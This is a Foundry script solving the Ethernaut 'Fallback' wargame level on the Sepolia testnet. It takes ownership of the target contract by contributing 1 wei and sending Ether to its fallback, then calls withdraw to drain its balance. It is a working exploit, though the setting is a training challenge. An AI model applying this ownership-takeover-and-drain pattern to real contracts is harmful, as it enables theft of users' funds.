// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../../src/ethernaut/01.sol";

// forge script script/ethernaut/01.s.sol --rpc-url $SEPOLIA_RPC_URL --account PK1_SEPOLIA --sender <SEPOLIA 1 PUBLIC ADDRESS> --broadcast -vvvv

contract FallbackScript is Script {
    Fallback public fallbackContract = Fallback(payable(0xa72954914B74F755193150c75e1e8D09dc7BEDE0));

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address owner = fallbackContract.owner();
        console.log("Fallback contract owner: ", owner);

        fallbackContract.contribute{value: 1 wei}();

        (bool sent,) = address(fallbackContract).call{value: 1 wei}("");
        require(sent, "Failed to send Ether");

        address newOwner = fallbackContract.owner();
        console.log("My address: ", msg.sender); // related to --sender
        console.log("Fallback contract newOwner: ", newOwner);

        uint256 balanceContractBefore = address(fallbackContract).balance;
        console.log("Fallback contract balance before: ", balanceContractBefore);

        fallbackContract.withdraw();

        uint256 balanceContractAfter = address(fallbackContract).balance;
        console.log("Fallback contract balance after: ", balanceContractAfter);

        vm.stopBroadcast();
    }
}
